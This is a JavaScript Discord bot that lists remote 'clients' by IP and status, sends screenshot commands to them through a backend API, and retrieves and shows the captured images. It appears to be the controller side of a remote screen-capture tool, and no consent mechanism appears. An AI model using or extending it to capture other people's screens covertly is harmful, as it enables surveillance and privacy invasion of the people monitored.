import { Client, GatewayIntentBits, EmbedBuilder, ButtonBuilder, ActionRowBuilder, StringSelectMenuBuilder,
    AttachmentBuilder } from 'discord.js';
import config from './config.json' assert {type: 'json'};
import axios from "axios";
import {commands} from './commands.js';

const { TOKEN, API_BASE_URL } = config;
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setActivity('/help');
});

const handleHelpCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    const embed = new EmbedBuilder()
        .setTitle('Help')
        .setDescription('Here are the available commands:')
        .addFields(commands.map(command => ({
            name: `/${command.name}`,
            value: command.description,
        })))
        .setTimestamp();
    await interaction.editReply({ embeds: [embed] });
};

const handleScreenshotCommand = async (interaction) => {
    const ip = interaction.options.getString('ip');
    await interaction.deferReply({ ephemeral: true });
    axios.post(`${API_BASE_URL}/command`, { command: 'screenshot', ip: ip })
        .then(response => {
            if (response.data.status === 'error') {
                interaction.editReply(`${response.data.message}`);
            }else{
                interaction.editReply(`Screenshot command sent to client with **IP: ${ip}**`);
            }
        })
        .catch(error => {
            console.error("Error sending the command", error);
            interaction.editReply("Error sending the command.");
        });
};

const handleClientsCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });

    const statusFilter = interaction.options.getString('status');
    const url = `${API_BASE_URL}/clients${statusFilter ? `?status=${statusFilter}` : ''}`;

    try {
        const response = await axios.get(url);
        const clients = response.data.clients;

        if (clients.length === 0) {
            await interaction.editReply("No clients available based on the selected filter.");
            return;
        }

        if (statusFilter) {
            const color = statusFilter === 'online' ? '#00FF00' : '#FF0000';
            const embed = new EmbedBuilder()
                .setTitle(`Clients ${statusFilter.toUpperCase()}`)
                .setDescription(clients.map(client =>
                    `**${client.name || 'Unnamed client'}**\n
                    **IP :** ${client.ip}
                    **Created At :** ${client.date_created}
                    **Updated At :** ${client.date_updated}`
                ).join('\n\n'))
                .setColor(color)
                .setTimestamp();

            await interaction.editReply({ embeds: [embed] });
        } else {
            const onlineClients = clients.filter(client => client.status === 'online');
            const offlineClients = clients.filter(client => client.status === 'offline');

            const embeds = [];

            if (onlineClients.length > 0) {
                embeds.push(new EmbedBuilder()
                    .setTitle('Clients ONLINE')
                    .setDescription(onlineClients.map(client =>
                        `**${client.name || 'Unnamed client'}**\n
                        **IP :** ${client.ip}
                        **Created At :** ${client.date_created}
                        **Updated At :** ${client.date_updated}`
                    ).join('\n\n'))
                    .setColor('#00FF00')
                    .setTimestamp());
            }

            if (offlineClients.length > 0) {
                embeds.push(new EmbedBuilder()
                    .setTitle('Clients OFFLINE')
                    .setDescription(offlineClients.map(client =>
                        `**${client.name || 'Unnamed client'}**\n
                        **IP :** ${client.ip}
                        **Created At :** ${client.date_created}
                        **Updated At :** ${client.date_updated}`
                    ).join('\n\n'))
                    .setColor('#FF0000')
                    .setTimestamp());
            }

            await interaction.editReply({ embeds: embeds });
        }
    } catch (error) {
        console.error("Error retrieving clients", error);
        await interaction.editReply("An error occurred while retrieving clients.");
    }
};

const handleStopCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    await interaction.editReply('Stopping the bot...');
    process.exit(0);
};

const handleListAllScreenshotsCommand = async (interaction) => {
    await interaction.deferReply({ ephemeral: true });
    axios.get(`${API_BASE_URL}/screenshot`)
        .then(response => {
            const screenshots = response.data.screenshots;
            if (!screenshots || Object.keys(screenshots).length === 0) {
                interaction.editReply("No screenshots available.");
                return;
            }

            const uniqueIps = Object.keys(screenshots);
            const buttons = uniqueIps.slice(0, 5).map(ip =>
                new ButtonBuilder().setCustomId(`ip_${ip}`).setLabel(ip).setStyle(1));

            if (buttons.length > 0) {
                const row = new ActionRowBuilder().addComponents(...buttons);
                interaction.editReply({ content: "Select an IP to view screenshots:", components: [row] });
            } else {
                interaction.editReply("Error: No valid IPs found.");
            }
        })
        .catch(error => {
            console.error("Error retrieving screenshots", error);
            interaction.editReply("Error retrieving screenshots.");
        });
};

client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand()) {
        switch (interaction.commandName) {
            case 'help':
                await handleHelpCommand(interaction);
                break;
            case 'screenshot':
                await handleScreenshotCommand(interaction);
                break;
            case 'clients':
                await handleClientsCommand(interaction);
                break;
            case 'stop':
                await handleStopCommand(interaction);
                break;
            case 'listallscreenshots':
                await handleListAllScreenshotsCommand(interaction);
                break;
        }
    } else if (interaction.isButton()) {
        const ip = interaction.customId.split('_')[1];
        axios.get(`${API_BASE_URL}/screenshot/${ip}`)
            .then(response => {
                const screenshots = response.data.screenshots;
                if (screenshots.length === 0) {
                    interaction.update({ content: "No screenshots available for this IP.", components: [] });
                    return;
                }

                const options = screenshots.map((s, index) => ({
                    label: `Screenshot ${index + 1}`,
                    description: s.substring(0, 100),
                    value: s,
                }));

                const selectMenu = new StringSelectMenuBuilder()
                    .setCustomId('select_screenshot')
                    .setPlaceholder('Select a screenshot')
                    .addOptions(options);

                const row = new ActionRowBuilder().addComponents(selectMenu);

                interaction.update({ content: `Select a screenshot for IP: ${ip}`, components: [row] });
            })
            .catch(error => {
                console.error("Error retrieving screenshots for IP", error);
                interaction.update({ content: "Error retrieving screenshots for this IP.", components: [] });
            });
    }else if (interaction.isStringSelectMenu()) {
        if (interaction.customId === 'select_screenshot') {
            const screenshotIdentifier = interaction.values[0].substring(11);
            const imageUrl = `${API_BASE_URL}/screenshot/${screenshotIdentifier}`;
            axios.get(imageUrl, { responseType: 'arraybuffer' })
                .then(response => {
                    const imageBuffer = response.data;
                    const attachment = new AttachmentBuilder(imageBuffer, { name: 'screenshot.png' });

                    const embed = new EmbedBuilder()
                        .setTitle('Screenshot')
                        .setDescription('Here is the requested screenshot:')
                        .setImage('attachment://screenshot.png');

                    interaction.update({
                        content: 'Here is the screenshot:',
                        files: [attachment],
                        embeds: [embed],
                        components: [],
                    });
                })
                .catch(error => {
                    console.error("Error retrieving screenshot from API", error);
                    interaction.update({ content: "Error retrieving screenshot.", components: [] });
                });
        }
    }
});

client.login(TOKEN);